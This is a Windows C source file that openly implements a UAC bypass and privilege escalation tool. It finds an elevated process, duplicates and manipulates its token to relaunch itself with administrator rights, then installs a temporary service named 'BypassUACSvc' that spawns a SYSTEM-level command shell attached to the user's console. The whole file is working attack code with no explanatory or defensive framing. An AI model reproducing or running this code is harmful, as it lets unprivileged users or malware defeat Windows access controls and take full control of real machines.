#include <stdio.h>
#include <tchar.h>

#include <windows.h>
#include <Psapi.h>
#include <sddl.h>
#include <AclAPI.h>
#include <winternl.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "ntdll.lib")

#define ProcThreadAttributeConsoleReference ((PROC_THREAD_ATTRIBUTE_NUM)10)

#define PROC_THREAD_ATTRIBUTE_CONSOLE_REFERENCE \
    ProcThreadAttributeValue (ProcThreadAttributeConsoleReference, FALSE, TRUE, FALSE)

HANDLE(*lpfnBaseGetConsoleReference)() = (HANDLE(*)())GetProcAddress(GetModuleHandle(TEXT("kernelbase.dll")),
                                                                     "BaseGetConsoleReference");

/*++
Routine Description: This routine returns TRUE if the caller's
process is a member of the Administrators local group. Caller is NOT
expected to be impersonating anyone and is expected to be able to
open its own process and process token.
Arguments: None.
Return Value:
   TRUE - Caller has Administrators local group.
   FALSE - Caller does not have Administrators local group. --
*/
BOOL IsUserAdmin() {
    BOOL b;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    b = AllocateAndInitializeSid(&NtAuthority,
                                 2,
                                 SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS,
                                 0, 0, 0, 0, 0, 0,
                                 &AdministratorsGroup);
    if (b) {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &b)) 
            b = FALSE;
        FreeSid(AdministratorsGroup);
    }

    return b;
}

// Return error code
DWORD MakeEveryoneAbleToWaitForProcess(HANDLE hProcess) {
    DWORD ExitReason = ERROR_SUCCESS;
    PSECURITY_DESCRIPTOR pSecDescriptor = NULL;
    PACL pDacl = NULL;
    PACL pNewDacl = NULL;
    EXPLICIT_ACCESS ea;

    ExitReason = GetSecurityInfo(hProcess,
                                 SE_KERNEL_OBJECT,				// process is a kernel object
                                 DACL_SECURITY_INFORMATION,		// we want its DACL
                                 NULL,							// we won't modify its owner
                                 NULL,							// we won't modify the groups it belongs to
                                 &pDacl,						// DACL is what we need
                                 NULL,							// we won't modify its SACL
                                 &pSecDescriptor);
    if (ExitReason != ERROR_SUCCESS)
        goto On_MakeEveryoneAbleToWaitForProcess_Error;

    // grant everyone "SYNCHRONIZE" access rights
    BuildExplicitAccessWithName(&ea,
                                (LPTSTR)TEXT("Everyone"),
                                SYNCHRONIZE,
                                GRANT_ACCESS,
                                NO_INHERITANCE);
    ExitReason = SetEntriesInAcl(1, &ea, pDacl, &pNewDacl);
    if (ExitReason != ERROR_SUCCESS)
        goto On_MakeEveryoneAbleToWaitForProcess_Error;

    ExitReason = SetSecurityInfo(hProcess,
                                 SE_KERNEL_OBJECT,
                                 DACL_SECURITY_INFORMATION,
                                 NULL,
                                 NULL,
                                 pNewDacl,
                                 NULL);
    if (ExitReason != ERROR_SUCCESS)
        goto On_MakeEveryoneAbleToWaitForProcess_Error;

On_MakeEveryoneAbleToWaitForProcess_Error:
    if (pNewDacl)
        LocalFree(pNewDacl);
    if (pSecDescriptor)
        LocalFree(pSecDescriptor);
    return ExitReason;
}

void FillParentProcessID(LPTSTR lpBuffer, SIZE_T BufferCount) {
    NTSTATUS Status;
    ULONG ReturnLength;
    PROCESS_BASIC_INFORMATION ProcBasicInfo;

    Status = NtQueryInformationProcess(GetCurrentProcess(),
                                       ProcessBasicInformation,
                                       &ProcBasicInfo,
                                       sizeof(PROCESS_BASIC_INFORMATION),
                                       &ReturnLength);
    if (NT_SUCCESS(Status)) 
        _stprintf_s(lpBuffer, BufferCount, 
                    TEXT("%Iu"), 
                    (ULONG_PTR)ProcBasicInfo.Reserved3);    // Reserved3 is InheritedFromUniqueProcessId
}

void FillSessionID(LPTSTR lpBuffer, SIZE_T BufferCount) {
    DWORD ReturnLength;
    DWORD SessionID;

    if (GetTokenInformation(GetCurrentProcessToken(),
                            TokenSessionId,
                            &SessionID,
                            sizeof(DWORD),
                            &ReturnLength))
        _stprintf_s(lpBuffer, BufferCount, TEXT("%d"), SessionID);
}

LPCWSTR GetCurrentProcessPath() {
    NTSTATUS Status;
    ULONG ReturnLength;
    PROCESS_BASIC_INFORMATION ProcBasicInfo;

    Status = NtQueryInformationProcess(GetCurrentProcess(),
                                       ProcessBasicInformation,
                                       &ProcBasicInfo,
                                       sizeof(PROCESS_BASIC_INFORMATION),
                                       &ReturnLength);
    return ProcBasicInfo.PebBaseAddress->ProcessParameters->ImagePathName.Buffer;
}

// --------------------
// When Run As Normal User
// --------------------

void BypassUAC(HANDLE hToken) {
    SID_IDENTIFIER_AUTHORITY IdentityAuth = { 0, 0, 0, 0, 0, 0x10 };
    PSID pSid = NULL;
    TOKEN_MANDATORY_LABEL MandatoryLabel;
    HANDLE hLUAToken = NULL;
    HANDLE hDupToken = NULL;
    WCHAR szCommandLine[1024] = {};
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = {};
    DWORD dwCmdProcessID = 0;
    HANDLE hCmdProcess = NULL;

    if (!AllocateAndInitializeSid(&IdentityAuth, 1, 0x2000, 0, 0, 0, 0, 0, 0, 0, &pSid)) {
        _tprintf_s(TEXT("[*] AllocateAndInitializeSid failed. CODE: 0x%08X\n"), GetLastError());
        goto ON_BypassUAC_ERROR;
    } else {
        LPTSTR lpSidString = NULL;
        ConvertSidToStringSid(pSid, &lpSidString);
        _tprintf_s(TEXT("[*] AllocateAndInitializeSid succeed! pSid = 0x%p\n"), pSid);
        _tprintf_s(TEXT("    *pSid = %s\n"), lpSidString);
        LocalFree(lpSidString);
    }

    MandatoryLabel.Label.Sid = pSid;
    MandatoryLabel.Label.Attributes = SE_GROUP_INTEGRITY;

    if (!SetTokenInformation(hToken, TokenIntegrityLevel, &MandatoryLabel, sizeof(TOKEN_MANDATORY_LABEL))) {
        _tprintf_s(TEXT("[*] SetTokenInformation failed. CODE: 0x%08X\n"), GetLastError());
        goto ON_BypassUAC_ERROR;
    } else {
        _tprintf_s(TEXT("[*] SetTokenInformation succeed!\n"));
    }

    if (!CreateRestrictedToken(hToken, LUA_TOKEN, 0, NULL, 0, NULL, 0, NULL, &hLUAToken)) {
        _tprintf_s(TEXT("[*] CreateRestrictedToken failed. CODE: 0x%08X\n"), GetLastError());
        goto ON_BypassUAC_ERROR;
    } else {
        _tprintf_s(TEXT("[*] CreateRestrictedToken succeed! hLUAToken = 0x%p\n"), hLUAToken);
    }

    if (!DuplicateTokenEx(hLUAToken,
                          TOKEN_IMPERSONATE | TOKEN_QUERY,
                          NULL,
                          SecurityImpersonation,
                          TokenImpersonation, &hDupToken)) {
        _tprintf_s(TEXT("[*] DuplicateTokenEx failed. CODE: 0x%08X\n"), GetLastError());
        goto ON_BypassUAC_ERROR;
    } else {
        _tprintf_s(TEXT("[*] DuplicateTokenEx succeed! hLUAToken = 0x%p\n"), hDupToken);
    }

    if (!ImpersonateLoggedOnUser(hDupToken)) {
        _tprintf_s(TEXT("[*] ImpersonateLoggedOnUser failed. CODE: 0x%08X\n"), GetLastError());
        goto ON_BypassUAC_ERROR;
    } else {
        _tprintf_s(TEXT("[*] ImpersonateLoggedOnUser succeed!\n"));
    }

    swprintf_s(szCommandLine, L"\"%s\" \"0x%p\"", GetCurrentProcessPath(), lpfnBaseGetConsoleReference());

    if (!CreateProcessWithLogonW(L"i",
                                 L"j",
                                 L"k",
                                 LOGON_NETCREDENTIALS_ONLY,
                                 NULL,
                                 szCommandLine,
                                 CREATE_DEFAULT_ERROR_MODE,
                                 NULL,
                                 NULL,
                                 (LPSTARTUPINFOW)&si,
                                 &pi)) {
        _tprintf_s(TEXT("[*] CreateProcessWithLogonW failed. CODE: 0x%08X\n"), GetLastError());
    } else {
        _tprintf_s(TEXT("[*] CreateProcessWithLogonW succeed!\n"));
        _tprintf_s(TEXT("    Process ID = %d\n"), pi.dwProcessId);
        _tprintf_s(TEXT("    Thread ID = %d\n"), pi.dwThreadId);
        _tprintf_s(TEXT("\n"));
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    GetExitCodeProcess(pi.hProcess, &dwCmdProcessID);

    hCmdProcess = OpenProcess(SYNCHRONIZE, FALSE, dwCmdProcessID);

    WaitForSingleObject(hCmdProcess, INFINITE);

ON_BypassUAC_ERROR:
    if (hCmdProcess)
        CloseHandle(hCmdProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (hDupToken)
        CloseHandle(hDupToken);
    if (hLUAToken)
        CloseHandle(hLUAToken);
    if (pSid)
        FreeSid(pSid);
}

// --------------------
// When Run As Administrator
// --------------------

DWORD LaunchService() {
    DWORD dwCmdProcessID = 0;
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_STATUS ServiceStatus = {};
    
    TCHAR szParentProcessID[32] = {};
    TCHAR szSessionID[32] = {};
    TCHAR szParentConsoleReferenceHandle[32] = {};
    LPCTSTR Argv[3] = {
        szParentProcessID,
        szSessionID,
        szParentConsoleReferenceHandle
    };

    FillParentProcessID(szParentProcessID, _countof(szParentProcessID));
    FillSessionID(szSessionID, _countof(szSessionID));
    _stprintf_s(szParentConsoleReferenceHandle, TEXT("%s"), __targv[1]);

    hSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) {
        _tprintf_s(TEXT("[*] OpenSCManager failed. CODE: 0x%08X\n"), GetLastError());
        goto ON_LaunchService_ERROR;
    } else {
        _tprintf_s(TEXT("[*] OpenSCManager succeed!\n"));
    }

    hService = CreateServiceW(hSCManager,
                              L"BypassUACSvc",
                              L"Bypass UAC Service",
                              SERVICE_ALL_ACCESS,
                              SERVICE_WIN32_OWN_PROCESS,
                              SERVICE_DEMAND_START,
                              SERVICE_ERROR_NORMAL,
                              GetCurrentProcessPath(),
                              NULL,
                              NULL,
                              NULL,
                              NULL,
                              NULL);
    if (hService == NULL) {
        _tprintf_s(TEXT("[*] CreateService failed. CODE: 0x%08X\n"), GetLastError());
        goto ON_LaunchService_ERROR;
    } else {
        _tprintf_s(TEXT("[*] CreateService succeed!\n"));
    }

    _tprintf_s(TEXT("[*] Service Args[1] = Parent Process ID = %s\n"), szParentProcessID);
    _tprintf_s(TEXT("[*] Service Args[2] = Session ID = %s\n"), szSessionID);
    _tprintf_s(TEXT("[*] Service Args[3] = Parent Console Reference Handle = %s\n"), szParentConsoleReferenceHandle);

    if (!StartService(hService, _countof(Argv), Argv)) {
        _tprintf_s(TEXT("[*] StartService failed. CODE: 0x%08X\n"), GetLastError());
        goto ON_LaunchService_DeleteService;
    } else {
        _tprintf_s(TEXT("[*] StartService succeed!\n"));
    }

    while (QueryServiceStatus(hService, &ServiceStatus)) {
        if (ServiceStatus.dwCurrentState == SERVICE_STOPPED) {
            dwCmdProcessID = ServiceStatus.dwServiceSpecificExitCode;
            _tprintf_s(TEXT("[*] Cmd Process ID = %d\n"), dwCmdProcessID);
            break;
        }
        Sleep(100);
    }

ON_LaunchService_DeleteService:
    if (!DeleteService(hService)) {
        _tprintf_s(TEXT("[*] DeleteService failed. CODE: 0x%08X\n"), GetLastError());
        goto ON_LaunchService_ERROR;
    } else {
        _tprintf_s(TEXT("[*] DeleteService succeed!\n"));
    }

ON_LaunchService_ERROR:
    if (hService)
        CloseServiceHandle(hService);
    if (hSCManager)
        CloseServiceHandle(hSCManager);
    return dwCmdProcessID;
}

// --------------------
// When Run As Service
// --------------------

SERVICE_STATUS_HANDLE hServiceStatus;

DWORD WINAPI HandleEx(DWORD dwControl, DWORD dwEventType,
                      LPVOID lpEventData, LPVOID lpContext) {
    if (dwControl == SERVICE_CONTROL_STOP) {
        SERVICE_STATUS Status = {};
        Status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
        Status.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hServiceStatus, &Status);
        return NO_ERROR;
    } else {
        return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

void WINAPI ServiceMain(_In_ DWORD dwArgc, _In_ LPTSTR lpszArgv[]) {
    hServiceStatus = RegisterServiceCtrlHandlerEx(TEXT("BypassUACSvc"), HandleEx, NULL);

    SERVICE_STATUS Status = {};
    DWORD dwTargetProcessID = 0;
    DWORD dwTargetSessionID = 0;
    HANDLE hTargetProcessConsoleReference = NULL;
    TCHAR szCommandLine[MAX_PATH] = {};
    HANDLE hTargetProcess = NULL;
    HANDLE hSystemToken = NULL;
    
    STARTUPINFOEX StartupInfoEx = { sizeof(STARTUPINFOEX) };
    PROCESS_INFORMATION ProcInfo = {};
    Status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    
    if (dwArgc != 4)
        goto ON_ServiceMain_ERROR;
    
    dwTargetProcessID = _tcstoul(lpszArgv[1], NULL, 0);
    dwTargetSessionID = _tcstoul(lpszArgv[2], NULL, 0);
#if _M_X64
    hTargetProcessConsoleReference = (HANDLE)_tcstoull(lpszArgv[3], NULL, 0);
#else
    hTargetProcessConsoleReference = (HANDLE)_tcstoul(lpszArgv[3], NULL, 0);
#endif
    GetEnvironmentVariable(TEXT("ComSpec"), szCommandLine, _countof(szCommandLine));
    
    hTargetProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwTargetProcessID);
    if (hTargetProcess == NULL) 
        goto ON_ServiceMain_ERROR;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hSystemToken))
        goto ON_ServiceMain_ERROR;
    
    {
        HANDLE hNewToken = NULL;
        if (!DuplicateTokenEx(hSystemToken, 
                              TOKEN_ALL_ACCESS, 
                              NULL, 
                              SecurityImpersonation, 
                              TokenPrimary, 
                              &hNewToken))
            goto ON_ServiceMain_ERROR;
        
        CloseHandle(hSystemToken);
        hSystemToken = hNewToken;
    }

    if (!SetTokenInformation(hSystemToken, TokenSessionId, &dwTargetSessionID, sizeof(DWORD))) 
        goto ON_ServiceMain_ERROR;
    
    {
        SIZE_T AttributesSize;
        InitializeProcThreadAttributeList(NULL, 2, NULL, &AttributesSize);
        StartupInfoEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
                                                                                HEAP_ZERO_MEMORY,
                                                                                AttributesSize);
        InitializeProcThreadAttributeList(StartupInfoEx.lpAttributeList, 2, NULL, &AttributesSize);
    }
    
    if (!UpdateProcThreadAttribute(StartupInfoEx.lpAttributeList,
                                   NULL,
                                   PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                   &hTargetProcess,
                                   sizeof(HANDLE),
                                   NULL,
                                   NULL))
        goto ON_ServiceMain_ERROR;

    if (!UpdateProcThreadAttribute(StartupInfoEx.lpAttributeList,
                                   NULL,
                                   PROC_THREAD_ATTRIBUTE_CONSOLE_REFERENCE,
                                   &hTargetProcessConsoleReference,
                                   sizeof(HANDLE),
                                   NULL,
                                   NULL))
        goto ON_ServiceMain_ERROR;

    if (!CreateProcessAsUser(hSystemToken,
                             NULL,
                             szCommandLine,
                             NULL,
                             NULL,
                             TRUE,
                             EXTENDED_STARTUPINFO_PRESENT,
                             NULL,
                             NULL,
                             (LPSTARTUPINFO)&StartupInfoEx,
                             &ProcInfo)) {
        goto ON_ServiceMain_ERROR;
    }

    MakeEveryoneAbleToWaitForProcess(ProcInfo.hProcess);

ON_ServiceMain_ERROR:
    if (ProcInfo.hThread)
        CloseHandle(ProcInfo.hThread);
    if (ProcInfo.hProcess)
        CloseHandle(ProcInfo.hProcess);
    if (StartupInfoEx.lpAttributeList) {
        DeleteProcThreadAttributeList(StartupInfoEx.lpAttributeList);
        HeapFree(GetProcessHeap(), NULL, StartupInfoEx.lpAttributeList);
    }  
    if (hSystemToken)
        CloseHandle(hSystemToken);
    if (hTargetProcess)
        CloseHandle(hTargetProcess);
    Status.dwCurrentState = SERVICE_STOPPED;
    Status.dwServiceSpecificExitCode = ProcInfo.dwProcessId;
    SetServiceStatus(hServiceStatus, &Status);
}

BOOL FindElevatedProcess(LPDWORD lpProcessID, PHANDLE lpProcessHandle, PHANDLE lpProcessToken) {
    DWORD ProcessIDs[65536] = { 0 };
    DWORD dwNumberOfProcesses = 0;
    EnumProcesses(ProcessIDs, sizeof(ProcessIDs), &dwNumberOfProcesses);
    dwNumberOfProcesses /= sizeof(DWORD);

    _tprintf_s(TEXT("[*] Enumerating %d processes...\n"), dwNumberOfProcesses);
    for (DWORD i = 0; i < dwNumberOfProcesses; ++i) {
        DWORD ReturnLength;
        HANDLE hProcess = NULL;
        HANDLE hToken = NULL;
        TOKEN_ELEVATION_TYPE ElevationType;

        _tprintf_s(TEXT("    %8d/%d    Try PID = %-8d "), i, dwNumberOfProcesses, ProcessIDs[i]);
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, ProcessIDs[i]);
        if (hProcess == NULL) {
            _tprintf_s(TEXT("Cannot open process. Failed! CODE: 0x%08X\n"), GetLastError());
            continue;
        }

        if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken)) {
            _tprintf_s(TEXT("Cannot open process token. Failed! CODE: 0x%08X\n"), GetLastError());
            CloseHandle(hProcess);
            continue;
        }

        if (!GetTokenInformation(hToken,
                                 TokenElevationType,
                                 &ElevationType,
                                 sizeof(TOKEN_ELEVATION_TYPE),
                                 &ReturnLength)) {
            _tprintf_s(TEXT("Cannot query process token information. Failed! CODE: 0x%08X\n"), GetLastError());
            CloseHandle(hToken);
            CloseHandle(hProcess);
            continue;
        }

        if (ElevationType == TokenElevationTypeFull) {
            _tprintf_s(TEXT("OK.\n"));
            *lpProcessID = ProcessIDs[i];
            *lpProcessHandle = hProcess;
            *lpProcessToken = hToken;
            return TRUE;
        } else {
            _tprintf_s(TEXT("The process token cannot be used.\n"));
            CloseHandle(hToken);
            CloseHandle(hProcess);
        }
    }

    _tprintf_s(TEXT("[*] All of processes have been enumerated. Cannot find target process. Abort!\n"));
    return FALSE;
}

int _tmain(int argc, LPTSTR argv[], LPTSTR envp) {
    DWORD dwExitCode = 0;
    DWORD dwProcessID = 0;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    SERVICE_TABLE_ENTRY ServiceTable[2] = {
        { (LPTSTR)TEXT("BypassUACSvc"), ServiceMain },
        { NULL, NULL }
    };

    if (StartServiceCtrlDispatcher(ServiceTable)) 
        goto ON_tmain_ERROR;

    if (IsUserAdmin()) {
        _tprintf_s(TEXT("Is administrator!\n"));
        if (argc == 2)
            dwExitCode = LaunchService();
        _tprintf_s(TEXT("Press any key to continue...")); _gettchar();
        goto ON_tmain_ERROR;
    }   

    if (!FindElevatedProcess(&dwProcessID, &hProcess, &hToken))
        goto ON_tmain_ERROR;

    if (!DuplicateTokenEx(hToken,
                          TOKEN_ALL_ACCESS,
                          NULL,
                          SecurityImpersonation,
                          TokenPrimary,
                          &hDupToken)) {
        _tprintf_s(TEXT("[*] DuplicateTokenEx failed. CODE: 0x%08X\n"), GetLastError());
        goto ON_tmain_ERROR;
    } else {
        _tprintf_s(TEXT("[*] DuplicateTokenEx succeed!\n"));
    }

    BypassUAC(hDupToken);

ON_tmain_ERROR:
    if (hDupToken)
        CloseHandle(hDupToken);
    if (hToken)
        CloseHandle(hToken);
    if (hProcess)
        CloseHandle(hProcess);
    return dwExitCode;
}

